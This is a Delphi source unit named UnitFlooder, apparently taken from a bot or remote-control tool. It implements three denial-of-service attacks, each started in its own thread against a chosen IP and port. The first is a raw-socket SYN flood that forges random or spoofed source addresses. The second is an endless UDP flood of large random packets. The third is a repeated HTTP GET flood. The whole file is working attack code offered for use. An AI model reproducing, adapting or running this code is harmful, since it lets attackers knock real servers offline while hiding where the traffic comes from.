unit UnitFlooder;

interface

uses
  Windows, WinSock, UnitFunctions, SocketUnitEx;

procedure StartSynFlood(IP :String; Port :Integer);
procedure StartUdpFlood(IP :String; Port :Integer);
procedure StartHttpFlood(IP :String);
procedure StopUdpFlood;
procedure StopHttpFlood;
procedure StopSynFlood;

implementation
     
{$I Tcp_Ip_Header.inc}

const
  Len = 40;

type
  TPorts = array of Word;
  TSynOptions = packed record
    Delay: Cardinal;
    DstPorts: TPorts;
    SockAddr: TSockAddrIn;
    Num: Cardinal;
    RandomSeek: Integer;
    Sended: Cardinal;
    Socket: TSocket;
    SpoofIP: Cardinal;
    SrcPorts: TPorts;
  end;

  WordArray = ^TWordArray;
  TWordArray = array [0..0] of Word;
  
  Ppseudohdr_tcp = ^Tpseudohdr_tcp;
  Tpseudohdr_tcp = packed record
    saddr     : Cardinal;
    daddr     : Cardinal;
    zero      : Byte;
    protocol  : Byte;
    length    : Word;
    tcphdr    : TTCPhdr;
  end;

var
  SynThread, UdpThread, HttpThread: THandle;
  DosIp: String;
  DosPort: Integer;
  Buf: array [0..(Len - 1)] of Char;
  IPhdr: PIPhdr = @Buf[0];
  TCPhdr: PTCPhdr = @Buf[20];
  WSAData: TWSAData;
  UseDelay: Boolean;
  SynOpt: TSynOptions;
  LastUpdate: Cardinal = 0;

procedure CreateSocket;
begin
  SynOpt.Socket := Socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if SynOpt.Socket = INVALID_SOCKET then Halt(0);
  if SetSockOpt(SynOpt.Socket, IPPROTO_IP, 2, '1', 4) <> 0 then Halt(0);
end;

function CheckSum(data: WordArray; size: Integer): Word;
var
  i, sum: Integer;
begin
  sum := 0;
  i := 0;
  while size > 1 do
  begin
    Inc(sum, data^[i]);
    Dec(size, 2);
    Inc(i);
  end;
  if size <> 0 then Inc(sum, data^[i]);
  sum := (sum shr 16) + (sum and $ffff);
  Inc(sum, sum shr 16);
  Result := not sum;
end;

function Resolve(const host: PChar): Cardinal; // function for resolving host to ip
var
  InAddr: TInAddr;
  HostEnt: PHostEnt;
begin
  InAddr.S_addr := inet_addr(host); // convert ip address format (ex: 127.0.0.1) to cardinal
  if InAddr.S_addr = INADDR_NONE then // if it is not a ip address then resolve it
  begin
    HostEnt := GetHostByName(host);
    if not Assigned(HostEnt) then Halt(0);// if couldn't resolve the host then exit
    Move((HostEnt^.h_addr_list^)^, InAddr.S_addr, HostEnt^.h_length);
  end;
  Result := InAddr.S_addr;
end;

function GetRandomValue(const Range: Integer): Integer; // function for getting different random
begin                                                   // values between very short times
  SynOpt.RandomSeek := (SynOpt.RandomSeek xor Range) + 1;
  Result := (Random(High(Integer)) xor SynOpt.RandomSeek) mod Range;
end;

function GetRandomIP: Cardinal;
var
  IPArray: array [0..3] of Byte;
  i: Integer;
begin
  for i := 0 to 3 do IPArray[i] := GetRandomValue(255) + 1;
  Move(IPArray, Result, Sizeof(Result));
end;

var
  SeudoBuf: array [0..31] of Char;

procedure SendSyn(const sport, dport: Word);
  procedure SendSyn_FillIPhdr;
  begin
    IPhdr.ip_verlen := $45;
    IPhdr.ip_tos := 0;
    IPhdr.ip_len := htons(Len);
    IPhdr.ip_id := GetRandomValue(High(Word)) + 1;
    IPhdr.ip_ttl := 255;
    IPhdr.ip_p := 6; // 6 = TCP
    if SynOpt.SpoofIP = 0 then IPhdr.ip_src := GetRandomIP else
      IPhdr.ip_src := SynOpt.SpoofIP;
    IPhdr.ip_dst := SynOpt.SockAddr.sin_addr.S_addr;
    IPhdr.ip_sum := CheckSum(@IPhdr^, 20);
  end;

  procedure SendSyn_FillTCPhdr;
  var PSeudohdr: Ppseudohdr_tcp;
  begin
    if sport = 0 then TCPhdr.tcp_src := GetRandomValue(High(Word)) + 1  else
      TCPhdr.tcp_src := htons(sport);
    if dport = 0 then TCPhdr.tcp_dst := GetRandomValue(High(Word)) + 1 else
      TCPhdr.tcp_dst := htons(dport);
    TCPhdr.tcp_seq := GetRandomValue(High(Integer)) + 1;
    TCPhdr.tcp_ack := GetRandomValue(High(Integer)) + 1;
    TCPhdr.tcp_flags := $02; // 0x02 = syn flag
     TCPhdr.tcp_win := GetRandomValue(High(Word)) + 1;
    TCPhdr.tcp_urp := GetRandomValue(High(Word)) + 1;
    FillChar(SeudoBuf, Sizeof(SeudoBuf), 0);
    PSeudohdr := Ppseudohdr_tcp(@SeudoBuf); // for a correct tcp checksum
    PSeudohdr.saddr := IPhdr.ip_src;        // we must calculate it with a pseudo header
    PSeudohdr.daddr := IPhdr.ip_dst;
    PSeudohdr.protocol := 6;
    PSeudohdr.length := htons(20);
    PSeudohdr.tcphdr := TCPhdr^;
    TCPhdr.tcp_sum := CheckSum(@PSeudohdr^, 32);
  end;
begin
  FillChar(Buf, Len, 0);
  SendSyn_FillIPhdr;
  SendSyn_FillTCPhdr;
  Sendto(SynOpt.Socket, Buf, Len, 0, SynOpt.SockAddr, Sizeof(SynOpt.SockAddr));
end;

procedure SetDefaultOptions;
begin
  SynOpt.SockAddr.sin_addr.S_addr := Resolve(PChar(DosIp));
  SynOpt.SockAddr.sin_family := AF_INET;
  SynOpt.SockAddr.sin_port := GetRandomValue(High(Word)) + 1;
  SynOpt.Num := 200;
  SynOpt.SrcPorts[0] := 80;
  SynOpt.Delay := 40;
end;

function CanUpdate(const DelayValue: Cardinal; const Force: Boolean): Boolean;
begin
  Result := Force or ((GetTickCount - LastUpdate) >= DelayValue);
  if Result then LastUpdate := GetTickCount;
end;

procedure FloodSyn;
var
  j :Integer;
begin
  WSAStartUp($0101, WSAData);
  FillChar(SynOpt, Sizeof(SynOpt), 0);
  CreateSocket;
  try
    Randomize;
    SetDefaultOptions;
    UseDelay := SynOpt.Delay > 0;
    repeat
      for j := 0 to High(SynOpt.SrcPorts) do
      begin
        SendSyn(SynOpt.SrcPorts[j], DosPort);
        if UseDelay then Sleep(SynOpt.Delay);
      end;
      Inc(SynOpt.Sended);
      CanUpdate(50, SynOpt.Sended = SynOpt.Num);
    until SynOpt.Sended = SynOpt.Num;
  finally
    CloseSocket(SynOpt.Socket);
    WSACleanUp;
    MyStopThread(SynThread);
  end;
  exit;
end;

function GenerateBuf(Size :Integer) :String;
var
  Buffer  :String;
  I       :Integer;
  P       :Integer;
begin
  Buffer := '';
  for I := 1 to Size do
  begin
    Randomize;
    P := Random(255);
    Buffer := Buffer+char(P);
  end;
  Result := Buffer;
end;

procedure FloodUDP;
var
  Buffer :string;
  Host   :String;
  Sock   :TSocket;
  Sin    :SOCKADDR_IN;
  Size   :Integer;
begin
  WSAStartup(MAKEWORD(2, 2), wsaData);
  Host := ResolveIP(DosIp);
  Sock := Socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if Sock = SOCKET_ERROR then Exit;
  Sin.sin_family := AF_INET;
  Sin.sin_addr.s_addr := inet_addr(pchar(Host));

  while true do
  begin
    Randomize;
    Sin.sin_port := htons(DosPort);
    Size := Random(5000)+4000;
    Buffer := GenerateBuf(Size);
    SendTo(Sock, Buffer, Size, 0, Sin, SizeOf(Sin));
    Sleep(Random(50));
  end;

  CloseSocket(Sock);
  WSACleanup();
  MyStopThread(UdpThread);
end;

procedure FloodHttp;
var
  ClientSocket: TClientSocket;
  TmpStr: string;
begin
  ClientSocket := TClientSocket.Create;
  ClientSocket.Connect(DosIp, 80);
  if not ClientSocket.Connected then Exit;
	
  TmpStr := 'GET / HTTP/1.1' + #13#10 + 'Host:' + DosIp + #13#10 +
    'Connection: Keep-Alive' + #13#10 + #13#10;

  while ClientSocket.Connected = True do
  begin
    Sleep(50);
    ClientSocket.SendText(TmpStr);
  end;

  ClientSocket.Disconnect;
	ClientSocket.Free;  
	ClientSocket := nil;
  
  MyStopThread(HttpThread);
end;

procedure StopHttpFlood;
begin
  MyStopThread(HttpThread);
end;

procedure StopSynFlood;
begin
  MyStopThread(SynThread);
end;

procedure StartSynFlood(IP :String; Port :Integer);
begin
  DosIp := IP;
  DosPort := Port;
  SynThread := MyStartThread(@FloodSyn);                 
end;

procedure StopUdpFlood;
begin
  MyStopThread(UdpThread);
end;

procedure StartUdpFlood(IP :String; Port :Integer);
begin
  DosIp := IP;
  DosPort := Port;
  UdpThread := MyStartThread(@FloodUdp);
end;
  
procedure StartHttpFlood(IP :String);
begin
  DosIp := IP;
  HttpThread := MyStartThread(@FloodHttp);
end;

end.
